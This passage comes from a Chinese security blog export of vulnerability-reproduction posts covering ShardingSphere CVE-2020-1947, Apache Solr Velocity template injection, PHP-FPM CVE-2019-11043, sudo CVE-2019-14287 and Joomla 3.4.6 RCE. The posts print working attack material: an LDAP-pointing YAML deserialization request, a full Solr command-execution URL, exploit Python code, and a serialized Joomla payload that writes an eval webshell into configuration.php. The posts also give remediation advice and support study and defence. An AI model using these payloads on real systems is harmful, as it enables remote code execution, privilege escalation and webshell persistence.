9cdTAwM2UiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwucmVmbGVjdC5SZWZsZWN0aW9uQWNjZXNzb3IiOnt9LCJjb20uZ29vZ2xlLmdzb24uRmllbGROYW1pbmdQb2xpY3kkMSI6e30sImNvbS5nb29nbGUuZ3Nvbi5Hc29uIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuQXJyYXlUeXBlQWRhcHRlciQxIjp7fSwiamF2YS5sYW5nLnJlZmxlY3QuVHlwZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlR5cGVBZGFwdGVycyQzMyI6e30sIm9yZy5hcGFjaGUuc2hhcmRpbmdzcGhlcmUudWkuc2VjdXJpdHkuVXNlckF1dGhlbnRpY2F0aW9uU2VydmljZSI6e30sImJ5dGVbXSI6e30sImJ5dGUiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5PYmplY3RUeXBlQWRhcHRlciQxIjp7fSwiamF2YS5sYW5nLkludGVnZXIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5NYXBUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Db2xsZWN0aW9uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fSwiY29tLmdvb2dsZS5nc29uLkxvbmdTZXJpYWxpemF0aW9uUG9saWN5JDEiOnt9LCJjb20uZ29vZ2xlLmdzb24uTG9uZ1NlcmlhbGl6YXRpb25Qb2xpY3kiOnt9LCJqYXZhLmxhbmcuVGhyZWFkTG9jYWxcdTAwM2NqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLkdzb24kRnV0dXJlVHlwZUFkYXB0ZXJcdTAwM2M/XHUwMDNlXHUwMDNlXHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDM0Ijp7fSwiamF2YS51dGlsLkxpc3RcdTAwM2Njb20uZ29vZ2xlLmdzb24uRXhjbHVzaW9uU3RyYXRlZ3lcdTAwM2UiOnt9LCJqYXZhLmxhbmcuRG91YmxlIjp7fX0sImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiZmFjdG9yaWVzIjpbbnVsbCxudWxsLHsidmVyc2lvbiI6LTEuMCwibW9kaWZpZXJzIjoxMzYsInNlcmlhbGl6ZUlubmVyQ2xhc3NlcyI6dHJ1ZSwicmVxdWlyZUV4cG9zZSI6ZmFsc2UsInNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXSwiZGVzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W119LG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0seyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319LCJjb21wbGV4TWFwS2V5U2VyaWFsaXphdGlvbiI6ZmFsc2V9LHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0sbnVsbCx7ImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImZpZWxkTmFtaW5nUG9saWN5IjoiSURFTlRJVFkiLCJleGNsdWRlciI6eyJ2ZXJzaW9uIjotMS4wLCJtb2RpZmllcnMiOjEzNiwic2VyaWFsaXplSW5uZXJDbGFzc2VzIjp0cnVlLCJyZXF1aXJlRXhwb3NlIjpmYWxzZSwic2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdLCJkZXNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiYWNjZXNzb3IiOnt9fV0sImV4Y2x1ZGVyIjp7InZlcnNpb24iOi0xLjAsIm1vZGlmaWVycyI6MTM2LCJzZXJpYWxpemVJbm5lckNsYXNzZXMiOnRydWUsInJlcXVpcmVFeHBvc2UiOmZhbHNlLCJzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W10sImRlc2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdfSwiZmllbGROYW1pbmdTdHJhdGVneSI6IklERU5USVRZIiwiaW5zdGFuY2VDcmVhdG9ycyI6e30sInNlcmlhbGl6ZU51bGxzIjpmYWxzZSwiY29tcGxleE1hcEtleVNlcmlhbGl6YXRpb24iOmZhbHNlLCJnZW5lcmF0ZU5vbkV4ZWN1dGFibGVKc29uIjpmYWxzZSwiaHRtbFNhZmUiOnRydWUsInByZXR0eVByaW50aW5nIjpmYWxzZSwibGVuaWVudCI6ZmFsc2UsInNlcmlhbGl6ZVNwZWNpYWxGbG9hdGluZ1BvaW50VmFsdWVzIjpmYWxzZSwiZGF0ZVN0eWxlIjoyLCJ0aW1lU3R5bGUiOjIsImxvbmdTZXJpYWxpemF0aW9uUG9saWN5IjoiREVGQVVMVCIsImJ1aWxkZXJGYWN0b3JpZXMiOltdLCJidWlsZGVySGllcmFyY2h5RmFjdG9yaWVzIjpbXX19Content-Type: application/json;charset=utf-8Referer: http://192.168.80.138:8088/Connection: closeContent-Length: 598&#123; &quot;name&quot;: &quot;CVE-2020-1947&quot;, &quot;ruleConfiguration&quot;: &quot; encryptors:\n encryptor_aes:\n type: aes\n props:\n aes.key.value: 123456abc\n encryptor_md5:\n type: md5\n tables:\n t_encrypt:\n columns:\n user_id:\n plainColumn: user_plain\n cipherColumn: user_cipher\n encryptor: encryptor_aes\n order_id:\n cipherColumn: order_cipher\n encryptor: encryptor_md5&quot;, &quot;dataSourceConfiguration&quot;: &quot;!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: ldap://192.168.80.1:1389/ExportObject\n autoCommit: true&quot;&#125; *注意：Access-Token 要改为当前登录shardingsphere UI的token 查看服务器发现/tmp/CVE-2020-1947 文件touch命令执行成功 四、修复建议官方已经发布新版本https://github.com/apache/incubator-shardingsphere/releases 五、附录本次分析及复现的相关工具地址https://github.com/SecurityCN/Vulnerability-analysis/tree/master/CVE-2020-1947 参考*https://github.com/apache/incubator-shardingsphere/releases*https://github.com/Imanfeng/CVE-2020-1947]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>安全研究</tag>
        <tag>Java-Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警]]></title>
    <url>%2F2019%2F10%2F31%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[事件背景2019年10月31日，国外的安全研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，经过测试该poc真实有效，漏洞等级严重，影响面广。目前Apache Solr官方未发布该漏洞的补丁。 漏洞信息 漏洞名称 Apache Solr Velocity模版注入远程命令执行漏洞 CVE编号 暂无 CNVD编号 - 影响版本 参考影响范围 威胁等级 高危 公开时间 2019年10月31日 当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。当设置params.resource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。 影响范围：目前测试，影响Apache Solr 7.x到8.2.0（目前最新版本）。可能影响全版本Apache Solr 漏洞复现Poc：https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt Step1：访问Core Admin得到应用Path路径,此处为collection1修改应用配置solr.resource.loader.enabled 和params.resource.loader.enabled为true 12345678910111213141516171819POST /solr/collection1/config HTTP/1.1Host: ip:8983User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Length: 259&#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; Step2：执行命令 1http://ip:8983/solr/collection1/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 成功执行服务器命令 修复建议目前，官方尚未发布相关漏洞的安全补丁，请及时关注官方更新，网址：http://lucene.apache.org/solr/downloads.html 参考：https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt]]></content>
  </entry>
  <entry>
    <title><![CDATA[【漏洞复现】CVE-2019-11043/PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析]]></title>
    <url>%2F2019%2F10%2F23%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2019-11043-PHP-FPM%E5%9C%A8Nginx%E7%89%B9%E5%AE%9A%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[事件背景9月26日，PHP官方发布漏洞通告，提到Nginx与php-fpm服务器上存在的一处高危漏洞，由于Nginx的fastcgi_split_path_info模块在处理带 %0a 的请求时，对换行符 \n 处置不当使得将PATH_INFO 值置为空，从而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。目前开源社区已有漏洞Poc公开。 漏洞信息 漏洞名称 PHP-FPM在Nginx特定配置下远程代码执行 CVE编号 CVE-2019-11043 CNVD编号 - 影响版本 参考影响范围 威胁等级 高危 公开时间 2019年9月26日 影响范围Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 123456location ~ [^/]\.php(/|$) &#123; fastcgi_split_path_info ^(.+?\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; &#125;&#125; 漏洞复现1. 编译phuip-fpizdamgit clone https://github.com/neex/phuip-fpizdam go bulid*编译需要golang环境，另外中国区最好配置goproxy.cn否则编译会出错，配置goproxy.cn命令如下: 1go env -w GOPROXY=https://goproxy.cn,direct 编译成功 2. 环境搭建使用vulhub的漏洞环境 复现使用以下命令构造漏洞环境（需要docker环境） 123456wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.confwget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.ymlservice docker startdocker-compose up -dwget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.phpdocker cp index.php cve201911043_php_1:/var/www/html/inex.php /etc/nginx/conf.d/default.conf 配置如下，vulhub的环境nginx配置已更改，使用此环境无需再改 在浏览器打开http://192.168.80.132/index.php 3.Poc测试漏洞攻击使用编译成功的phuip-fpizdam测试 1phuip-fpizdam http://192.168.80.132/index.php 在浏览器访问：http://192.168.80.132:8080/index.php?a=id可以执行系统命令,id可以替换为其他OS命令 漏洞检测可以采用phuip-fpizdam 的 –skip-attack 参数进行无害的漏洞检测，命令如下： 1phuip-fpizdam http://192.168.80.132:8080/index.php --skip-attack 漏洞分析PHP-FPM(PHP FastCGI Process Manager)意：PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。 1.nginx与php-fpm结合的处理流程打开php-fpm.conf文件，我们看到如下配置：即:php-fpm模块监听127.0.0.1:9000端口，等待请求到来去处理。 Fast和Nginx，PHP的关系图 处理过程： 12345678910111213141516171819202122232425262728www.example.com | | Nginx | |路由到www.example.com/index.php | |加载nginx的fast-cgi模块 | |fast-cgi监听127.0.0.1:9000地址 | |www.example.com/index.php请求到达127.0.0.1:9000 | |php-fpm 监听127.0.0.1:9000 | |php-fpm 接收到请求，启用worker进程处理请求 | |php-fpm 处理完请求，返回给nginx | |nginx将结果通过http返回给浏览器 2.漏洞触发点因为“fpm_main.c”文件的第1150行代码中由于\n(%0a)的传入导致nginx传递给php-fpm的PATH_INFO为空。https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150进而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。 3.此漏洞利用的先决条件：1.php需要开启FPM模块，该模块在php虽然在PHP5.3.3之后已经加入php核心代码但是的PHP的发行版默认不安装php-fpm模块，所有默认的用户不受影响；要想php支持php-fpm，只需要在编译php源码的时候带上–enable-fpm；2.需要修改/nginx/conf/nginx.conf配置；故此该漏洞远程利用起来还是很难的，大家不必惊慌！！ 修复建议1.修改nginx配置文件中fastcgi_split_path_info的正则表达式,不允许.php之后传入不可显字符2.暂停使用 nginx+php-fpm 服务根据自己实际生产环境的业务需求，将以下配置删除 12fastcgi_split_path_info ^(.+?\.php)(/.*)$;fastcgi_param PATH_INFO $fastcgi_path_info; 参考[1].https://bugs.php.net/bug.php?id=78599[2].https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043[3].https://github.com/neex/phuip-fpizdam]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过]]></title>
    <url>%2F2019%2F10%2F15%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2019-14287-linux-sudo-root%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过 事件背景2019年10月14日，Sudo官方释放了新版本1.8.28，其中包含sudo root权限绕过漏洞的补丁修复。此漏洞编号是CVE-2019-14287，用户可以构造的payload,在特定条件下可以可以通过指定用户ID -1或4294967295以root用户身份运行命令。 漏洞信息 漏洞名称 sudo 权限绕过漏洞 CVE编号 CVE-2019-14287 CNVD编号 - 影响版本 sudo &lt;1.8.28 威胁等级 高危 公开时间 2019年10月14日 影响范围sudo &lt; 1.8.28 漏洞分析官网描述的漏洞细节（https://www.sudo.ws/alerts/minus_1_uid.html）从中截取部分如下：当 /etc/sudoers 文件存在如下形式的配置时，bob实际上可以通过运行sudo -u＃-1 vi来越权以root身份运行vi程序 1myhsot bob=(ALL, !root) /usr/bin/vi 先解释下这段配置myhsot -– 在myhost主机上，一般配置为ALL即在所有主机bob –- 表示将bob用户加入sudo组，如果给组赋权在前面加上%(ALL, !root) –-以root身份以外的任何用户身份/usr/bin/vi –- 允许执行的程序或命令，这里是只允许执行vi（详细介绍请参考官网手册https://www.sudo.ws/sudo/man/1.8.2/sudoers.man.html） 一句总结起来的就是：在/etc/sudoers配置中只允许用户bob以root身份以外的任何用户身份在myhost主机上运行vi。但是由于sudo存在漏洞，bob实际上可以通过运行sudo -u＃-1 vi来以root身份运行 vi程序。 漏洞复现1.查看sudo版本在Linux终端中使用sudo -V 命令查看版本该版本号为1.8.19p1,在影响范围中 使用普通用户lab(uid=1000)直接查看/etc/shadow提示权限拒绝 2.修改/etc/sudoers 文件修改/etc/sudoers 文件加入以下内容： ALL12345678910**允许lab用户在所有主机上以root身份以外的任何用户身份执行bin/bash程序**![]( 【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-17-31-19.png )*这一步配置主要是测试使用，实际运维工作中很少见##### 3.漏洞利用权限绕过1.进入lab的终端执行```sudo -u#-1 /bin/bash 对比发现uid=0(root)，gid和group均未发生变化查看/etc/shadows文件到这里就进行了绕过 修复建议升级sudo到1.8.28版本官网：https://www.sudo.ws 参考[1].https://www.sudo.ws/alerts/minus_1_uid.html[2].https://www.sudo.ws/sudo/man/1.8.2/sudoers.man.html 免责声明：本文中提到的测试利用代码、Poc和脚本工具仅供研究学习使用，请遵守《网络安全法》等相关法律法规。]]></content>
  </entry>
  <entry>
    <title><![CDATA[【漏洞分析】Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造]]></title>
    <url>%2F2019%2F10%2F09%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91Joomla-3-4-6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8CPoc%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-8562。建议使用就版本的用户更新到安全版本。 在此次漏洞复现和原理分析过程中，学到很多东西，在这里要感谢PHITHON关于Joomla远程代码执行漏洞的总结，让我少走了很多弯路。另外本文较长，请耐心阅读！ #影响范围Joomla 3.0.0 至 3.4.6 #漏洞复现1.安装部署 下载： https://downloads.joomla.org/it/cms/joomla3/3-4-6 浏览器访问 http://127.0.0.1/Joomla/3.4.6/installation/index.php 安装注意：第3步最终确认哪里，应该选择 “不安装示范数据”，目前测试的是选择”博客风格的示范内容”不能成功复现安装成功 2.Poc复现Poc地址:https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py 脚本利用 执行成功反弹shell并在“configuration.php”写入随机密码的一句话木马 可以用NC 监听和 菜刀连接 由于我的PHP是Windows环境所以无法反弹只能通过菜刀连接 caidao密码为 scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay 菜刀连接成功 #Exp攻击链分析目前互联网上公开的Exp下载地址:https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py通过漏洞复现和分析py脚本可以知道，在上传shell的时候有以下几步，之所以有这么手工步骤主要与Joomla的会话机制有关。 1.获取Cookie代码:通过burpeuite抓到的请求包1 123456GET /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: close 2.获取csrf-token （关键步骤）代码： 123456789def get_token(url, cook): token = &apos;&apos; resp = requests.get(url, cookies=cook, proxies = PROXS) html = BeautifulSoup(resp.text,&apos;html.parser&apos;) # csrf token is the last input for v in html.find_all(&apos;input&apos;): csrf = v csrf = csrf.get(&apos;name&apos;) return csrf 通过burpeuite抓到的请求包2： 1234567GET /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: dc674b0eef3d2412c63832504cf5ac18=sfoodgd4m6fj2c1895u5b2tmp6; 主要是从返回包中提取 csrftoken 3.生成payload 这里有2个payload后门的payload代码:利用PHP自带的file_put_contents函数写入webshell到configuration.php中，webshell内容如下： 1&apos;if(isset($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;])) eval($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;]);&apos; 反弹的payload 4.发送带有写入webshell的请求主要构造username,password,option,task,csrftoken等字段 123456789101112131415161718192021222324252627def make_req(url , object_payload): # just make a req with object print_info(&apos;Getting Session Cookie ..&apos;) cook = get_cook(url) print_info(&apos;Getting CSRF Token ..&apos;) csrf = get_token( url, cook) user_payload = &apos;\\0\\0\\0&apos; * 9 padding = &apos;AAA&apos; # It will land at this padding working_test_obj = &apos;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;&apos; clean_object = &apos;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&apos; # working good without bad effects inj_object = &apos;&quot;;&apos; inj_object += object_payload inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part password_payload = padding + inj_object params = &#123; &apos;username&apos;: user_payload, &apos;password&apos;: password_payload, &apos;option&apos;:&apos;com_users&apos;, &apos;task&apos;:&apos;user.login&apos;, csrf :&apos;1&apos; &#125; print_info(&apos;Sending request ..&apos;) resp = requests.post(url, proxies = PROXS, cookies = cook,data=params) return resp.text 下面是通过Burpsuite抓包获取的写入webshell的请求包3 1234567891011POST /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: dc674b0eef3d2412c63832504cf5ac18=bg7tprkie898gu5luh1it52ga3Content-Length: 1136Content-Type: application/x-www-form-urlencodedusername=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&amp;password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A217%3A%22file_put_contents%28%27configuration.php%27%2C%27if%28isset%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%29+eval%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&amp;option=com_users&amp;task=user.login&amp;03b291424900343c59f58ad131d087a7=1 5.连接webshell测试是否写入成功通过burpeuite抓到的请求包4： 12345678910POST /Joomla/3.4.6//configuration.php HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeContent-Length: 70Content-Type: application/x-www-form-urlencodedscgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay=echo+%27PWNED%27%3B #漏洞分析这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。 1.溢出当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。 漏洞利用文件‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（NN）替换‘\0\0\0’，重构原始对象。这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。举个栗子比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象: 1s:8:s:&quot;username&quot;;s:16:&quot;my\0\0\0username&quot; 当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值： 1s:8:s:&quot;username&quot;;s:16:&quot;myN*Nusername&quot; --&gt;不合法的大小 被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。 2. 对象注入（反序列化） (本部分参考PHITHON的博客)CVE-2015-8562的Poc如下 1User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;4 在这个执行链中，分别利用了如下类：JDatabaseDriverMysqliSimplePie 2.1 JDatabaseDriverMysqli类我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作： 123456789101112131415161718192021&lt;?phppublic function __destruct() &#123; $this-&gt;disconnect(); &#125; ... public function disconnect() &#123; // Close the connection. if ($this-&gt;connection) &#123; foreach ($this-&gt;disconnectHandlers as $h) &#123; call_user_func_array($h, array( &amp;$this)); &#125; mysqli_close($this-&gt;connection); &#125; $this-&gt;connection = null; &#125; 当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用destruct，destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。 但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。 